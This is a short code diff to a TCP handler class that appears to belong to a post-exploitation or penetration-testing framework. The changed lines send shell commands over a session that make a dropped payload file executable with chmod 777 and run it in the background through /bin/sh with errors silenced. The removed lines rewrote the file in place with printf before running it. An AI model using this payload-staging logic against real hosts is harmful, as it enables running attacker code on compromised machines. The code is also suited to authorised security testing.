@@ -86,16 +86,12 @@ class Handler(TCP):
             else:
                 sender(*args, command)
 
-        if encode:
-            sender(*args, f"printf $(cat {path}) > {path}\n".encode())
-        else:
-            sender(*args, f"printf $(cat {path}) > {path}")
         args = args if args is not None else ""
 
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; /bin/sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; /bin/sh -c '{path} {payload_args}' 2>/dev/null &")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
